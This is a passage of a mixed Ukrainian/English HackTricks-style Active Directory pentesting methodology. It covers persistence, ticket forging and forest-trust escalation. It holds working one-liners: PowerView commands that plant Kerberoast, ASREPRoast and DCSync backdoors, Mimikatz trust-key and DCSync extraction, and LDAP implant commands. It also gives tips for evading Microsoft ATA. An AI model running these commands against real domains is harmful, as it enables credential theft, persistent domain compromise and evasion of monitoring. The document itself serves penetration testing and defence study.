{{#endref}}

### Abuse Printer Spooler service

Виявлення **Spool service listening** у domain можна **abuse**, щоб **acquire new credentials** і **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abuse third party sessions

Якщо **other users** **access** **compromised** machine, можна **gather credentials from memory** і навіть **inject beacons in their processes**, щоб impersonate їх.\
Зазвичай users отримують доступ до system через RDP, тому тут описано, як виконати кілька атак на third party RDP sessions:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** надає system для керування **local Administrator password** на domain-joined computers, забезпечуючи його **randomized**, унікальність і часту **changed**. Ці passwords зберігаються в Active Directory, а доступ до них контролюється через ACLs лише для authorized users. За наявності достатніх permissions для доступу до цих passwords стає можливим pivoting до інших computers.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Gathering certificates** із compromised machine може бути способом escalate privileges всередині environment:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Abuse Certificate Templates

Якщо налаштовано **vulnerable templates**, їх можна abuse для escalate privileges:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Після отримання привілеїв **Domain Admin** або, ще краще, **Enterprise Admin** можна **dump** **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Деякі з описаних вище технік можна використовувати для persistence.\
Наприклад, можна:

- Зробити users vulnerable до [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Зробити users vulnerable до [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Надати user привілеї [**DCSync**](#dcsync)

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** створює **legitimate Ticket Granting Service (TGS) ticket** для specific service, використовуючи **NTLM hash** (наприклад, **hash of the PC account**). Цей метод застосовується для **access the service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** передбачає отримання attacker-ом **NTLM hash of the krbtgt account** в Active Directory (AD) environment. Цей account є особливим, оскільки використовується для підпису всіх **Ticket Granting Tickets (TGTs)**, необхідних для authentication у AD network.

Після отримання цього hash attacker може створювати **TGTs** для будь-якого account на свій вибір (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Це схоже на golden tickets, підроблені у спосіб, що **bypasses common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Having certificates of an account or being able to request them** — це дуже хороший спосіб зберегти persistence в user account (навіть якщо він змінить password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Using certificates is also possible to persist with high privileges inside the domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Object **AdminSDHolder** в Active Directory забезпечує security **privileged groups** (наприклад, Domain Admins і Enterprise Admins), застосовуючи стандартний **Access Control List (ACL)** до цих groups для запобігання unauthorized changes. Однак цю feature можна exploit-нути: якщо attacker змінить ACL AdminSDHolder, надавши regular user full access, цей user отримає extensive control над усіма privileged groups. Отже, цей security mechanism, призначений для захисту, може мати протилежний ефект і дозволити unwarranted access, якщо його не monitor-ити.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Усередині кожного **Domain Controller (DC)** існує **local administrator** account. Отримавши admin rights на такій machine, можна extract-нути local Administrator hash за допомогою **mimikatz**. Після цього потрібна registry modification для **enable the use of this password**, що дозволить remote access до local Administrator account.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Можна **give** **special permissions** певному **user** над specific domain objects, що дозволить user **escalate privileges in the future**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** використовуються для **store** **permissions**, які **object** має **over** інший **object**. Якщо ви можете лише **make** **little change** у **security descriptor** object, то отримаєте дуже цікаві privileges над цим object без необхідності бути member-ом privileged group.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abuse auxiliary class `dynamicObject`, щоб створювати short-lived principals/GPOs/DNS records з `entryTTL`/`msDS-Entry-Time-To-Die`; вони самі видаляються без tombstones, стираючи LDAP evidence, водночас залишаючи orphan SIDs, broken `gPLink` references або cached DNS responses (наприклад, AdminSDHolder ACE pollution чи malicious `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Змінити **LSASS** у memory, щоб встановити **universal password**, який надає access до всіх domain accounts.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Можна створити **own SSP**, щоб **capture** у **clear text** **credentials**, які використовуються для access до machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Він реєструє **new Domain Controller** в AD і використовує його для **push attributes** (SIDHistory, SPNs...) у specified objects, **without** leaving any **logs** щодо **modifications**. Потрібні привілеї **DA** і перебування всередині **root domain**.\
Зверніть увагу: якщо використати неправильні data, з’являться досить ugly logs.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Раніше ми розглядали, як escalate privileges, якщо маєте **enough permission to read LAPS passwords**. Однак ці passwords також можна використовувати для **maintain persistence**.\
Дивіться:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft розглядає **Forest** як security boundary. Це означає, що **compromising a single domain could potentially lead to the entire Forest being compromised**.<sup>[[1]](#references)</sup>

### Basic Information

[**Domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) — це security mechanism, який дозволяє user з одного **domain** отримувати access до resources в іншому **domain**. Фактично він створює linkage між authentication systems двох domains, дозволяючи authentication verifications безперешкодно проходити між ними. Коли domains налаштовують trust, вони обмінюються та зберігають specific **keys** у своїх **Domain Controllers (DCs)**, які є критично важливими для integrity цього trust.

У типовому сценарії, якщо user хоче отримати доступ до service у **trusted domain**, він спочатку має request special ticket, відомий як **inter-realm TGT**, у DC свого domain. Цей TGT encrypted за допомогою shared **key**, про який домовилися обидва domains. Потім user передає цей TGT **DC of the trusted domain**, щоб отримати service ticket (**TGS**). Після successful validation inter-realm TGT DC trusted domain видає TGS, надаючи user access до service.

**Steps**:

1. **Client computer** у **Domain 1** починає процес, використовуючи свій **NTLM hash**, щоб request **Ticket Granting Ticket (TGT)** у свого **Domain Controller (DC1)**.
2. DC1 видає новий TGT, якщо client успішно authenticated.
3. Потім client request-ить **inter-realm TGT** у DC1, який потрібен для access до resources у **Domain 2**.
4. Inter-realm TGT encrypted за допомогою **trust key**, shared між DC1 і DC2 як частина two-way domain trust.
5. Client передає inter-realm TGT до **Domain 2's Domain Controller (DC2)**.
6. DC2 перевіряє inter-realm TGT за допомогою shared trust key і, якщо він valid, видає **Ticket Granting Service (TGS)** для server у Domain 2, до якого client хоче отримати access.
7. Нарешті client передає цей TGS server-у, який encrypted за допомогою server’s account hash, щоб отримати access до service у Domain 2.

### Different trusts

Важливо зазначити, що **trust може бути 1-way або 2-way**. У 2-way варіанті обидва domains trust один одного, але в **1-way** trust relation один domain буде **trusted**, а інший — **trusting** domain. В останньому випадку **ви зможете access-ити resources лише всередині trusting domain із trusted domain**.

Якщо Domain A trusts Domain B, A є trusting domain, а B — trusted. Крім того, для **Domain A** це буде **Outbound trust**, а для **Domain B** — **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Це поширена конфігурація в межах одного forest, де child domain автоматично має two-way transitive trust зі своїм parent domain. Фактично це означає, що authentication requests можуть безперешкодно проходити між parent і child.
- **Cross-link Trusts**: Також відомі як "shortcut trusts"; вони встановлюються між child domains для прискорення referral processes. У complex forests authentication referrals зазвичай мають піднятися до forest root, а потім спуститися до target domain. Створення cross-links скорочує цей шлях, що особливо корисно в geographically dispersed environments.
- **External Trusts**: Вони налаштовуються між різними, unrelated domains і за своєю природою є non-transitive. Згідно з [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts корисні для доступу до resources у domain поза межами поточного forest, який не підключений forest trust. Security посилюється завдяки SID filtering з external trusts.
- **Tree-root Trusts**: Ці trusts автоматично встановлюються між forest root domain і новим tree root. Хоча вони зустрічаються нечасто, tree-root trusts важливі для додавання нових domain trees до forest, дозволяючи їм зберігати unique domain name і забезпечуючи two-way transitivity. Більше information наведено в [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Цей тип trust є two-way transitive trust між двома forest root domains і також застосовує SID filtering для посилення security measures.
- **MIT Trusts**: Ці trusts встановлюються з non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. MIT trusts є більш specialized і призначені для environments, що потребують integration із Kerberos-based systems поза Windows ecosystem.

#### Other differences in **trusting relationships**

- Trust relationship також може бути **transitive** (A trusts B, B trusts C, тоді A trusts C) або **non-transitive**.
- Trust relationship можна налаштувати як **bidirectional trust** (обидва trust-ять один одного) або як **one-way trust** (лише один trust-ить іншого).

### Attack Path

1. **Enumerate** the trusting relationships
2. Перевірте, чи має будь-який **security principal** (user/group/computer) **access** до resources **other domain**, можливо через ACE entries або membership у groups іншого domain. Шукайте **relationships across domains** (ймовірно, саме для цього trust і було створено).
1. У цьому випадку kerberoast також може бути ще одним варіантом.
3. **Compromise** **accounts**, які можуть виконувати **pivot** між domains.

Attackers із доступом до resources в іншому domain можуть використовувати три основні mechanisms:

- **Local Group Membership**: Principals можуть бути додані до local groups на machines, наприклад до “Administrators” group на server, що надає їм значний control над цією machine.
- **Foreign Domain Group Membership**: Principals також можуть бути members groups у foreign domain. Однак effectiveness цього методу залежить від nature trust і scope group.
- **Access Control Lists (ACLs)**: Principals можуть бути specified в **ACL**, зокрема як entities в **ACEs** у складі **DACL**, що надає їм access до specific resources. Для тих, хто хоче глибше розібратися в mechanics ACLs, DACLs і ACEs, whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” є invaluable resource.<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

Можна перевірити **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**, щоб знайти foreign security principals у domain. Це будуть user/group з **an external domain/forest**.

Це можна перевірити у **Bloodhound** або за допомогою powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Ескалація привілеїв у лісі від дочірнього домену до батьківського
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Інші способи перерахування довірчих відносин домену:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Існує **2 довірені ключі**: один для _Child --> Parent_, а інший для _Parent_ --> _Child_.\
> Ви можете отримати ключ, який використовується поточним доменом, за допомогою:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Підвищте привілеї до Enterprise admin у дочірньому/батьківському домені, зловживаючи довірою за допомогою SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Експлуатація доступного для запису Configuration NC

Розуміння того, як можна експлуатувати Configuration Naming Context (NC), має вирішальне значення. Configuration NC слугує центральним сховищем даних конфігурації для всього forest у середовищах Active Directory (AD). Ці дані реплікуються на кожен Domain Controller (DC) у forest, причому доступні для запису DC підтримують доступну для запису копію Configuration NC. Для цієї атаки необхідно мати **SYSTEM privileges на DC**, бажано на дочірньому DC.

**Прив’язка GPO до сайту кореневого DC**

Контейнер Sites у Configuration NC містить інформацію про сайти всіх комп’ютерів, приєднаних до домену, у межах AD forest. Маючи SYSTEM privileges на будь-якому DC, атакери можуть прив’язувати GPO до сайтів кореневого DC. Ця дія потенційно компрометує кореневий домен шляхом маніпулювання політиками, що застосовуються до цих сайтів.

Для отримання докладнішої інформації можна ознайомитися з дослідженням [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Компрометація будь-якої gMSA у forest**

Один із векторів атаки передбачає націлювання на привілейовані gMSA у домені. KDS Root key, необхідний для обчислення паролів gMSA, зберігається в Configuration NC. Маючи SYSTEM privileges на будь-якому DC, можна отримати доступ до KDS Root key і обчислити паролі будь-якої gMSA у всьому forest.

Докладний аналіз і покрокові інструкції наведено в:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Додаткова атака на делеговану MSA (BadSuccessor – зловживання атрибутами міграції):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Додаткове зовнішнє дослідження: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Атака зі зміною Schema**

Цей метод вимагає терпіння та очікування створення нових привілейованих AD-об’єктів. Маючи SYSTEM privileges, атакер може змінити AD Schema, щоб надати будь-якому користувачу повний контроль над усіма класами. Це може призвести до несанкціонованого доступу та контролю над новоствореними AD-об’єктами.

Додаткову інформацію наведено в [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Від DA до EA за допомогою ADCS ESC5**

Вразливість ADCS ESC5 спрямована на контроль над об’єктами Public Key Infrastructure (PKI) для створення certificate template, який забезпечує автентифікацію як будь-який користувач у межах forest. Оскільки об’єкти PKI розташовані в Configuration NC, компрометація доступного для запису дочірнього DC дає змогу виконувати атаки ESC5.

Докладніше про це можна прочитати в [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> У сценаріях без ADCS атакер може налаштувати необхідні компоненти, як описано в [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Зовнішній домен forest - односторонній (вхідний) або двонаправлений
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
У цьому сценарії **ваш домен є довіреним** зовнішнім доменом, який надає вам **невизначені дозволи** щодо нього. Вам потрібно буде визначити, **які принципали вашого домену мають який доступ до зовнішнього домену**, а потім спробувати скористатися цим:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Зовнішній домен лісу - односторонній (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
У цьому сценарії **your domain** **довіряє** певні **privileges** суб'єкту з **інших доменів**.

Однак, коли **domain is trusted** доменом, який довіряє, довірений домен **створює користувача** з **передбачуваним ім'ям**, який використовує як **пароль пароль довіреного домену**. Це означає, що можна **отримати доступ до користувача з домену, який довіряє, щоб проникнути до довіреного домену**, виконати його enumeration і спробувати підвищити привілеї:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Інший спосіб скомпрометувати довірений домен — знайти [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links), створений у **протилежному напрямку** від довірчих відносин між доменами (що трапляється не дуже часто).

Ще один спосіб скомпрометувати довірений домен — залишатися на машині, до якої може отримати доступ **користувач із довіреного домену**, щоб він увійшов через **RDP**. Після цього attacker може ін'єктувати code у процес RDP-сесії та **отримати доступ до вихідного домену жертви** звідти.\
Крім того, якщо **жертва під'єднала свій жорсткий диск**, attacker може з процесу **RDP session** зберегти **backdoors** у **startup folder жорсткого диска**. Ця техніка називається **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Пом'якшення атак на довірчі відносини доменів

### **SID Filtering:**

- Ризик атак із використанням атрибута SID history між forest trusts зменшується завдяки SID Filtering, який за замовчуванням активований для всіх inter-forest trusts. Це ґрунтується на припущенні, що intra-forest trusts є безпечними, оскільки відповідно до позиції Microsoft межею безпеки вважається forest, а не domain.
- Однак є нюанс: SID filtering може порушувати роботу застосунків і доступ користувачів, що призводить до його періодичного вимкнення.

### **Selective Authentication:**

- Для inter-forest trusts використання Selective Authentication гарантує, що користувачі з двох forest не проходять автентифікацію автоматично. Натомість користувачам потрібні явні дозволи для доступу до доменів і серверів у trusting domain або forest.
- Важливо зазначити, що ці заходи не захищають від експлуатації writable Configuration Naming Context (NC) або атак на trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## LDAP-based AD Abuse from On-Host Implants

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) повторно реалізує LDAP primitives у стилі bloodyAD як x64 Beacon Object Files, які повністю працюють усередині on-host implant (наприклад, Adaptix C2). Operators компілюють pack за допомогою `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, завантажують `ldap.axs`, а потім викликають `ldap <subcommand>` з beacon. Увесь traffic проходить через поточний logon security context поверх LDAP (389) із signing/sealing або LDAPS (636) з автоматичною довірою до сертифікатів, тому socks proxies або disk artifacts не потрібні.<sup>[[4]](#references)</sup>

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` і `get-groupmembers` перетворюють короткі імена/шляхи OU на повні DN і виводять відповідні objects.
- `get-object`, `get-attribute` і `get-domaininfo` отримують довільні attributes (зокрема security descriptors), а також metadata forest/domain з `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` і `get-rbcd` безпосередньо з LDAP надають roasting candidates, delegation settings і наявні дескриптори [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).
- `get-acl` і `get-writable --detailed` аналізують DACL, щоб перелічити trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes) та inheritance, надаючи безпосередні targets для ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP-примітиви запису для ескалації та persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) дають оператору змогу створювати нові principals або облікові записи машин там, де існують права на OU. `add-groupmember`, `set-password`, `add-attribute` і `set-attribute` безпосередньо захоплюють цільові об’єкти після виявлення прав write-property.
- Команди, орієнтовані на ACL, такі як `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` і `add-dcsync`, перетворюють WriteDACL/WriteOwner для будь-якого об’єкта AD на скидання паролів, контроль членства в групах або привілеї реплікації DCSync без залишення артефактів PowerShell/ADSI. Відповідні команди `remove-*` очищають додані ACE.

### Delegation, roasting і зловживання Kerberos

- `add-spn`/`set-spn` миттєво роблять скомпрометованого користувача придатним для Kerberoast; `add-asreproastable` (перемикач UAC) позначає його для AS-REP roasting без зміни пароля.
- Макроси Delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) змінюють `msDS-AllowedToDelegateTo`, прапорці UAC або `msDS-AllowedToActOnBehalfOfOtherIdentity` безпосередньо з beacon, уможливлюючи шляхи атак constrained/unconstrained/RBCD та усуваючи потребу у віддаленому PowerShell або RSAT.

### Ін’єкція sidHistory, переміщення OU і формування attack surface

- `add-sidhistory` додає привілейовані SID до SID history контрольованого principal (див. [SID-History Injection](sid-history-injection.md)), забезпечуючи приховане успадкування доступу повністю через LDAP/LDAPS.
- `move-object` змінює DN/OU комп’ютерів або користувачів, даючи атакувальнику змогу перемістити активи до OU, де вже існують делеговані права, перш ніж використати `set-password`, `add-groupmember` або `add-spn`.
- Команди видалення з вузькою областю дії (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` тощо) дають змогу швидко виконати rollback після збору облікових даних або налаштування persistence, мінімізуючи telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Загальні засоби захисту

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Захисні заходи для захисту облікових даних**

- **Обмеження для Domain Admins**: рекомендується дозволяти Domain Admins виконувати login лише на Domain Controllers, не допускаючи їх використання на інших хостах.
- **Привілеї Service Account**: служби не повинні запускатися з привілеями Domain Admin (DA), щоб підтримувати безпеку.
- **Тимчасове обмеження привілеїв**: для завдань, що потребують привілеїв DA, їхню тривалість слід обмежувати. Цього можна досягти за допомогою: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Захист від LDAP relay**: перевіряйте Event IDs 2889/3074/3075, а потім увімкніть LDAP signing і прив’язування каналу LDAPS на DC/клієнтах, щоб блокувати спроби LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Виявлення активності Impacket на рівні протоколу

Якщо ви хочете виявляти поширені AD tradecraft, **не покладайтеся лише на артефакти, контрольовані оператором**, такі як перейменовані binaries, імена служб, тимчасові batch-файли або шляхи виводу. Визначте baseline того, як легітимні клієнти Windows формують трафік [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC і WMI, а потім шукайте **особливості реалізації**, які зберігаються навіть після редагування оператором `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` або `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Кандидати з високою достовірністю як окремі ознаки** (після перевірки на власному baseline):
- Автентифікований DCE/RPC із використанням `auth_context_id = 79231 + ctx_id`
- Заповнення padding автентифікації DCE/RPC значенням `0xff`
- LDAP Kerberos binds, які розміщують необроблений Kerberos `AP-REQ` безпосередньо в SPNEGO `mechToken`
- Запити negotiate SMB2/3 зі значеннями `ClientGuid`, що виглядають як ASCII
- WMI `IWbemLevel1Login::NTLMLogin` із нестандартним namespace `//./root/cimv2`
- Жорстко задані значення nonce Kerberos
- **Краще використовувати як ознаки для кореляції/оцінювання**:
- Розріджені або дубльовані списки Kerberos etype, незвичні/відсутні `PA-DATA` або порядок etype у TGS-REQ, що відрізняється від native Windows
- Повідомлення NTLM Type 1 без інформації про версію або повідомлення Type 3 із null host names
- Необроблений NTLMSSP у DCE/RPC замість SPNEGO, відсутні verification trailers DCE/RPC або невідповідності OID SPNEGO/Kerberos
- Кілька таких ознак від одного host/user/session/time window значно сильніші за будь-яке окреме слабке поле
- **Використовуйте як enrichment, а не як окремі alerts**:
- Стандартні filenames, output paths, випадкові імена служб, імена тимчасових batch-файлів, стандартні імена облікових записів комп’ютерів і специфічні для tool рядки HTTP/WebDAV/RDP/MSSQL
- Операторам легко їх змінити, тому їх краще використовувати для пояснення, чому cross-protocol cluster є підозрілим
- **Операційні примітки**:
- Деякі з цих сигналів потребують розшифрованого трафіку, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW або видимості на стороні служби
- Перевірте їх на клієнтах Samba/Linux, appliances і legacy software, перш ніж перетворювати на alerts
- Переводьте detections з enrichment -> hunting -> alerting у міру підвищення впевненості у baseline

### **Реалізація Deception Techniques**

- Реалізація deception передбачає встановлення пасток, наприклад decoy users або computers, із такими властивостями, як паролі, що не закінчуються, або позначення Trusted for Delegation. Детальний підхід передбачає створення користувачів із певними правами або додавання їх до груп із високими привілеями.<sup>[[2]](#references)</sup>
- Практичний приклад передбачає використання таких tools: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Більше інформації про розгортання deception techniques наведено в [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Виявлення Deception**

- **Для User Objects**: підозрілими індикаторами є нетиповий ObjectSID, рідкісні logons, дати створення та низька кількість невдалих спроб введення пароля.
- **Загальні індикатори**: порівняння атрибутів потенційних decoy objects з атрибутами справжніх об’єктів може виявити невідповідності. Tools на кшталт [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) можуть допомогти виявити таку deception.

### **Обхід систем виявлення**

- **Обхід Microsoft ATA Detection**:
- **User Enumeration**: уникайте enumeration сесій на Domain Controllers, щоб запобігти виявленню ATA.
- **Ticket Impersonation**: використання ключів **aes** для створення ticket допомагає уникнути виявлення, оскільки не відбувається downgrade до NTLM.
- **DCSync Attacks**: рекомендується виконувати їх з non-Domain Controller, щоб уникнути виявлення ATA, оскільки безпосереднє виконання з Domain Controller спричинить alerts.

## References

- [1] [A Guide to Attacking Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Forging Trusts for Deception in Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [From Domain Admin to Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [A journey into forgotten Null Session and MS-RPC interfaces](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter as security boundary between domains? (Part 4) - Bypass SID filtering research](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter as security boundary between domains? (Part 5) - Golden GMSA trust attack - from child to parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter as security boundary between domains? (Part 6) - Schema change trust attack - from child to parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Escalating from child domain's admins to enterprise admins in 5 minutes by abusing AD CS, a follow up](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [An ACE Up the Sleeve: Designing Active Directory DACL Backdoors](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)

{{#include ../../banners/hacktricks-training.md}}
